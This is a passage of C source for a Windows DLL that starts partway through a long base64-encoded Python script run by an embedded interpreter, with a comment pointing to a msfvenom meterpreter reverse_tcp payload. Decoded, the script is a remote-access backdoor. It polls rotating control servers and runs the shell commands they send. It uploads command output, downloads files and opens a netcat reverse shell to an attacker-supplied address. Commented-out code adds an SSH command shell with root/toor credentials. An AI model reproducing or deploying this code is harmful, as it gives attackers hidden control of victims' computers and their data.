6Ly8iK3NpdGUrIi9zdmMvd3VwLnBocD9wYz0iK3NDT01QVVRFUk5BTUUrIiZ3dXA9IitzVGltZSkucmVhZCgpCiAgICAgICAgICAgICAgI3Jlc3BvbnNlID0gdXJsbGliMi51cmxvcGVuKCJodHRwOi8vIitzaXRlKyIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyImd3VwPSIrc1RpbWUpIysiJmR1bXA9YWFhYWEiKQogICAgICAgICAgICAgICNodHRwU2Vydi5yZXF1ZXN0KCdHRVQnLCAiL3N2Yy93dXAucGhwP3BjPSIrc0NPTVBVVEVSTkFNRSsiJnd1cD0iK3NUaW1lKQogICAgICAgICAgICAgICNyZXNwb25zZSA9IGh0dHBTZXJ2LmdldHJlc3BvbnNlKCkKICAgICAgICAgICAgICB1cmwgPSAiaHR0cDovLyIrc2l0ZSsiL3N2Yy93dXAucGhwP3BjPSIrc0NPTVBVVEVSTkFNRSsiJnd1cD0iK3NUaW1lCiAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhlYWRlcikKICAgICAgICAgICAgICAjc3Jlc3BvbnNlPXJlc3BvbnNlLnJlYWQoKQogICAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDojaHR0cGxpYi5PSzoKICAgICAgICAgICAgICAjaWYgc3Jlc3BvbnNlIT0gJyc6CiAgICAgICAgICAgICAgICAgICAgICBwcmludCAoIk91dHB1dCBmcm9tIEhUTUwgcmVxdWVzdCIpCiAgICAgICAgICAgICAgICAgICAgICBzcmVzcG9uc2UgPSByZXNwb25zZS50ZXh0CiAgICAgICAgICAgICAgICAgICAgICBpZmluZD1zcmVzcG9uc2UuZmluZCgnaXA9JykKICAgICAgICAgICAgICAgICAgICAgIHNpcCA9IHNyZXNwb25zZVtpZmluZCszOnNyZXNwb25zZS5maW5kKCd8fCcsaWZpbmQpXQogICAgICAgICAgICAgICAgICAgICAgaWZpbmQ9c3Jlc3BvbnNlLmZpbmQoJ3BvcnQ9JykKICAgICAgICAgICAgICAgICAgICAgIHNwb3J0ID0gc3Jlc3BvbnNlW2lmaW5kKzU6c3Jlc3BvbnNlLmZpbmQoJ3x8JyxpZmluZCldCiAgICAgICAgICAgICAgICAgICAgICBpZmluZD1zcmVzcG9uc2UuZmluZCgna2lsbD0nKQogICAgICAgICAgICAgICAgICAgICAgc2tpbGwgPSBzcmVzcG9uc2VbaWZpbmQrNTpzcmVzcG9uc2UuZmluZCgnfHwnLGlmaW5kKV0KICAgICAgICAgICAgICAgICAgICAgIGlmaW5kPXNyZXNwb25zZS5maW5kKCdpb3V0PScpCiAgICAgICAgICAgICAgICAgICAgICBzb3V0ID0gc3Jlc3BvbnNlW2lmaW5kKzU6c3Jlc3BvbnNlLmZpbmQoJ3x8JyxpZmluZCldCiAgICAgICAgICAgICAgICAgICAgICBpZmluZD1zcmVzcG9uc2UuZmluZCgnZXhlYz0nKQogICAgICAgICAgICAgICAgICAgICAgc2V4ZWMgPSBzcmVzcG9uc2VbaWZpbmQrNTpzcmVzcG9uc2UuZmluZCgnfHwnLGlmaW5kKV0KICAgICAgICAgICAgICAgICAgICAgIGlmaW5kPXNyZXNwb25zZS5maW5kKCdjbWQ9JykKICAgICAgICAgICAgICAgICAgICAgIHNjbWQgPSBzcmVzcG9uc2VbaWZpbmQrNDpzcmVzcG9uc2UuZmluZCgnfHwnLGlmaW5kKV0KICAgICAgICAgICAgICAgICAgICAgIHByaW50IChza2lsbCkKICAgICAgICAgICAgICBlbHNlOgojICAgICAgICAgICAgICAgICAgICAgIGxvZ2dpbmcuaW5mbygnTm90IDIwMCcpCiAgICAgICAgICAgICAgICAgICAgICAjbXlsb29wKCkKICAgICAgICAgICAgICAgICAgICAgIGlmIHNpdGUgPT0gc2l0ZTE6CiAgICAgICAgICAgICAgICAgICAgICAgICAgc2l0ZT1zaXRlMgogICAgICAgICAgICAgICAgICAgICAgZWxpZiBzaXRlID09IHNpdGUyOgogICAgICAgICAgICAgICAgICAgICAgICAgIHNpdGU9c2l0ZTMKICAgICAgICAgICAgICAgICAgICAgIGVsaWYgc2l0ZSA9PSBzaXRlMzoKICAgICAgICAgICAgICAgICAgICAgICAgICBzaXRlPXNpdGUxCiAgICAgICAgICAgICAgICAgICAgICAjaHR0cFNlcnYucmVxdWVzdCgnR0VUJywgIi9zdmMvd3VwLnBocD9wYz0iK3NDT01QVVRFUk5BTUUrIiZ3dXA9IitzVGltZSkKICAgICAgICAgICAgICAgICAgICAgICNyZXNwb25zZSA9IGh0dHBTZXJ2LmdldHJlc3BvbnNlKCkKICAgICAgICAgICAgICAgICAgICAgIHVybCA9ICJodHRwOi8vIitzaXRlKyIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyImd3VwPSIrc1RpbWUKICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXIpCiAgICAgICAgICAgICAgICAgICAgICAjaWYgc3Jlc3BvbnNlIT0gJyc6CiAgICAgICAgICAgICAgICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6I2h0dHBsaWIuT0s6CiAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCJPdXRwdXQgZnJvbSBIVE1MIHJlcXVlc3QiKQogICAgICAgICAgICAgICAgICAgICAgICAgIHNyZXNwb25zZSA9IHJlc3BvbnNlLnRleHQKICAgICAgICAgICAgICAgICAgICAgICAgICBpZmluZD1zcmVzcG9uc2UuZmluZCgnaXA9JykKICAgICAgICAgICAgICAgICAgICAgICAgICBzaXAgPSBzcmVzcG9uc2VbaWZpbmQrMzpzcmVzcG9uc2UuZmluZCgnfHwnLGlmaW5kKV0KICAgICAgICAgICAgICAgICAgICAgICAgICBpZmluZD1zcmVzcG9uc2UuZmluZCgncG9ydD0nKQogICAgICAgICAgICAgICAgICAgICAgICAgIHNwb3J0ID0gc3Jlc3BvbnNlW2lmaW5kKzU6c3Jlc3BvbnNlLmZpbmQoJ3x8JyxpZmluZCldCiAgICAgICAgICAgICAgICAgICAgICAgICAgaWZpbmQ9c3Jlc3BvbnNlLmZpbmQoJ2tpbGw9JykKICAgICAgICAgICAgICAgICAgICAgICAgICBza2lsbCA9IHNyZXNwb25zZVtpZmluZCs1OnNyZXNwb25zZS5maW5kKCd8fCcsaWZpbmQpXQogICAgICAgICAgICAgICAgICAgICAgICAgIGlmaW5kPXNyZXNwb25zZS5maW5kKCdpb3V0PScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgc291dCA9IHNyZXNwb25zZVtpZmluZCs1OnNyZXNwb25zZS5maW5kKCd8fCcsaWZpbmQpXQogICAgICAgICAgICAgICAgICAgICAgICAgIGlmaW5kPXNyZXNwb25zZS5maW5kKCdleGVjPScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgc2V4ZWMgPSBzcmVzcG9uc2VbaWZpbmQrNTpzcmVzcG9uc2UuZmluZCgnfHwnLGlmaW5kKV0KICAgICAgICAgICAgICAgICAgICAgICAgICBpZmluZD1zcmVzcG9uc2UuZmluZCgnY21kPScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgc2NtZCA9IHNyZXNwb25zZVtpZmluZCs0OnNyZXNwb25zZS5maW5kKCd8fCcsaWZpbmQpXQogICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50IChza2lsbCkKICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICNodHRwU2Vydi5jbG9zZSgpCiAgICAgICAgICAgICAgaWYgc2V4ZWMgPT0gJzEnOgogICAgICAgICAgICAgICAgICAgICAgc0NPTVBVVEVSTkFNRT1vcy5nZXRlbnYoJ0NPTVBVVEVSTkFNRScpKyJfIitzbWFjYWRkcmVzcwogICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNvdXQgPT0gJzEnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZHVtcD1zdWJwcm9jZXNzLmNoZWNrX291dHB1dChzY21kLHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCwgc2hlbGw9VHJ1ZSkKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZXNzPXN1YnByb2Nlc3MuUG9wZW4oc2NtZCxzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCwgc2hlbGw9VHJ1ZSkKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwID0gUG9wZW4oc2NtZCxzaGVsbD1UcnVlKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybmNvZGUgPSBwcm9jZXNzLndhaXQoKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCdyZXR1cm4gY29kZScuZm9ybWF0KHJldHVybmNvZGUpKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNkdW1wPXByb2Nlc3Muc3Rkb3V0LnJlYWQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZXh0X2ZpbGUgPSBvcGVuKG9zLmdldGVudignVEVNUCcpKyJcXCIgKyBzQ09NUFVURVJOQU1FLCAidyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRleHRfZmlsZS53cml0ZShzZHVtcCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGV4dF9maWxlLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZXMgPSB7J3VzZXJmaWxlJzogb3Blbihvcy5nZXRlbnYoJ1RFTVAnKSsiXFwiICsgc0NPTVBVVEVSTkFNRSwgJ3JiJyl9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwOi8vJyArIHNpdGUgKycvdXBsb2FkLnBocCcsZmlsZXM9ZmlsZXMpICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI2lmIGxlbihzZHVtcCk8MjAwNjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI3NkdW1wID0gc2R1bXAucmVwbGFjZSgiXCciLCAiIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI3NkdW1wID0gc2R1bXAucmVwbGFjZSgiXFwiLCAiXFxcXCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNkdW1wID0gc2R1bXAucmVwbGFjZSgiXHJcbiIsICI8YnI+IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI3NkdW1wID0gc2R1bXAucmVwbGFjZSgiXG4iLCAiPGJyPiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNzZHVtcCA9IHNkdW1wLnJlcGxhY2UoIlxyIiwgIjxicj4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZHVtcCA9IHNkdW1wLnJlcGxhY2UoIiAiLCAiJTIwIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI3NkdW1wID0gc2R1bXBbIDAgOiAyMDA1XQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjaHR0cFNlcnYgPSBodHRwbGliLkhUVFBDb25uZWN0aW9uKHNpdGUsIDgwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjaHR0cFNlcnYuY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNyZXNwb25zZSA9IHVybGxpYjIudXJsb3BlbigiaHR0cDovLyIrc2l0ZSsiL3N2Yy93dXAucGhwP3BjPSIrc0NPTVBVVEVSTkFNRSsiJmR1bXA9IitzZHVtcCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI2h0dHBTZXJ2LnJlcXVlc3QoJ0dFVCcsICIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyImZHVtcD0iK3NkdW1wKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjcmVzcG9uc2UgPSBodHRwU2Vydi5nZXRyZXNwb25zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybCA9ICJodHRwOi8vIitzaXRlKyIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyImZHVtcD0iK3NkdW1wCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNodHRwU2Vydi5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWdldGZpbGU9c2NtZC5maW5kKCdnZXRmaWxlJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWZpbGU9c2NtZC5yZmluZCgnLycpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGlnZXRmaWxlPT0wOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2V0dXJsID1zY21kWzg6bGVuKHNjbWQpXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZmlsZWRlc3Q9IHNjbWRbaWZpbGUrMTpsZW4oc2NtZCldCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNmID0gdXJsbGliMi51cmxvcGVuKGdldHVybCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICN3aXRoIG9wZW4oc3dpbisnXFwnKyBzZmlsZWRlc3QsICJ3YiIpIGFzIGNvZGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjICAgIGNvZGUud3JpdGUoZi5yZWFkKCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oZ2V0dXJsKSBhcyByZXNwb25zZSwgb3Blbihzd2luKydcXCcrIHNmaWxlZGVzdCwgJ3diJykgYXMgb3V0X2ZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHJlc3BvbnNlLnJlYWQoKSAjIGEgYGJ5dGVzYCBvYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRfZmlsZS53cml0ZShkYXRhKSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAgPSBQb3BlbihzY21kLHNoZWxsPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgI3ByaW50IHIudGV4dAogICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50IChzdHIoZSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgI215bG9vcCgpCiAgICAgICAgICAgICAgICAgICAgICAjaHR0cFNlcnYgPSBodHRwbGliLkhUVFBDb25uZWN0aW9uKHNpdGUsIDgwKQogICAgICAgICAgICAgICAgICAgICAgI2h0dHBTZXJ2LmNvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgICAgI3Jlc3BvbnNlID0gdXJsbGliMi51cmxvcGVuKCJodHRwOi8vIitzaXRlKyIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyImZXhlYz0wIikKICAgICAgICAgICAgICAgICAgICAgICNodHRwU2Vydi5yZXF1ZXN0KCdHRVQnLCAiL3N2Yy93dXAucGhwP3BjPSIrc0NPTVBVVEVSTkFNRSsiJmV4ZWM9MCIpCiAgICAgICAgICAgICAgICAgICAgICAjcmVzcG9uc2UgPSBodHRwU2Vydi5nZXRyZXNwb25zZSgpCiAgICAgICAgICAgICAgICAgICAgICB1cmwgPSAiaHR0cDovLyIrc2l0ZSsiL3N2Yy93dXAucGhwP3BjPSIrc0NPTVBVVEVSTkFNRSsiJmV4ZWM9MCIKICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXIpCiAgICAgICAgICAgICAgICAgICAgICAjaHR0cFNlcnYuY2xvc2UoKQogICAgICAgICAgICAgIGlmIHNraWxsID09ICcwJzoKICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoJ2M6XHdpbmRvd3Ncc3lzd293NjQnKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAgPSBQb3BlbigibmMuZXhlIC1lIGNtZC5leGUgIitzaXArIiAiK3Nwb3J0LHNoZWxsPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjb3Muc3lzdGVtKCJuYy5leGUgLWUgY21kLmV4ZSAiK3NpcCsiICIrc3BvcnQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAgPSBQb3BlbigibmM2NC5leGUgLWUgY21kLmV4ZSAiK3NpcCsiICIrc3BvcnQsc2hlbGw9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNvcy5zeXN0ZW0oIm5jNjQuZXhlIC1lIGNtZC5leGUgIitzaXArIiAiK3Nwb3J0KQogICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50IChzdHIoZSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgI215bG9vcCgpCiAgICAgICAgICAgICAgICAgICAgICAjaHR0cFNlcnYgPSBodHRwbGliLkhUVFBDb25uZWN0aW9uKHNpdGUsIDgwKQogICAgICAgICAgICAgICAgICAgICAgI2h0dHBTZXJ2LmNvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgICAgI3Jlc3BvbnNlID0gdXJsbGliMi51cmxvcGVuKCJodHRwOi8vIitzaXRlKyIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyIma2lsbD0xIikKICAgICAgICAgICAgICAgICAgICAgICNodHRwU2Vydi5yZXF1ZXN0KCdHRVQnLCAiL3N2Yy93dXAucGhwP3BjPSIrc0NPTVBVVEVSTkFNRSsiJmtpbGw9MSIpCiAgICAgICAgICAgICAgICAgICAgICAjcmVzcG9uc2UgPSBodHRwU2Vydi5nZXRyZXNwb25zZSgpCiAgICAgICAgICAgICAgICAgICAgICB1cmwgPSAiaHR0cDovLyIrc2l0ZSsiL3N2Yy93dXAucGhwP3BjPSIrc0NPTVBVVEVSTkFNRSsiJmtpbGw9MSIKICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXIpCiAgICAgICAgICAgICAgICAgICAgICAjaHR0cFNlcnYuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsaWVudCA9IHBhcmFtaWtvLlNTSENsaWVudCgpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGllbnQuc2V0X21pc3NpbmdfaG9zdF9rZXlfcG9saWN5KHBhcmFtaWtvLkF1dG9BZGRQb2xpY3koKSkKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI2xhYmVsIC5teUxhYmVsCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICN0cnk6CiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNzaXAgPSAnMTg0LjcyLjg5Ljc0JwogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGllbnQuY29ubmVjdChzaXAsIHVzZXJuYW1lPSdyb290JywgcGFzc3dvcmQ9J3Rvb3InLHBvcnQ9aW50KHNwb3J0KSkKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoYW4gPSBjbGllbnQuZ2V0X3RyYW5zcG9ydCgpLm9wZW5fc2Vzc2lvbigpCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFuLnNlbmQoJ0hleSBpIGFtIGNvbm5lY3RlZCA6KSAnKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgY2hhbi5yZWN2KDEwMjQpCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSBjaGFuLnJlY3YoMTAyNCkKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCBzdHIobGVuKGNvbW1hbmQpKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50IGNvbW1hbmQKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBjb21tYW5kID09ICdleGl0JyBvciBsZW4oY29tbWFuZCkgPT0gMDoKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsaWVudC5jbG9zZSgpCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDTUQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChjb21tYW5kLCBzaGVsbD1UcnVlKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFuLnNlbmQoQ01EKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhbi5zZW5kKHN0cihlKSkKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKHN0cihlKSkKICAgICAgICAgICAgICBzaXRlPXNpdGUxCiAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKIyAgICAgICAgICAgICAgYXBwX2xvZy5pbmZvKCdFeGNlcHRpb24gJXMnLHN0cihlKSkKICAgICAgICAgICAgICBwcmludCAoc3RyKGUpKQogICAgICAgICAgICAgICNwcmludCBlLmVycm5vCiAgICAgICAgICAgICAgI2lmIGUuZXJybm8gPT0gMTEwMDE6IAogICAgICAgICAgICAgIHRpbWUuc2xlZXAoMTApIAogICAgICAgICAgICAgICNteWxvb3AoKSAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICBpZiBzaXRlID09IHNpdGUxOgogICAgICAgICAgICAgICAgICBzaXRlPXNpdGUyCiAgICAgICAgICAgICAgZWxpZiBzaXRlID09IHNpdGUyOgogICAgICAgICAgICAgICAgICBzaXRlPXNpdGUzCiAgICAgICAgICAgICAgZWxpZiBzaXRlID09IHNpdGUzOgogICAgICAgICAgICAgICAgICBzaXRlPXNpdGUxCiAgICAgICAgICAgICAgCiN0aW1lLnNsZWVwKDEwKQoKICAgICAgICAgICAgCnRyeTogICAgICAgICAgICAgICAKICAgbXlsb29wKCkgCiAgIHRpbWUuc2xlZXAoNjApCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgcHJpbnQgKHN0cihlKSkgCiAgIHRpbWUuc2xlZXAoNjApCiAgIG15bG9vcCgpIAogICAgICAgICAgICA=')))"); /* write here your python meterpreter payload : msfvenom --payload=python/meterpreter/reverse_tcp LHOST=192.168.0.28 LPORT=4444 */
    Py_Finalize();  

}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
{
	switch(fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		{
			break;
		}
		case DLL_PROCESS_DETACH:
		{
			break;
		}
		case DLL_THREAD_ATTACH:
		{
			break;
		}
		case DLL_THREAD_DETACH:
		{
			break;
		}
	}
	
	/* Return TRUE on success, FALSE on failure */
	return TRUE;
}
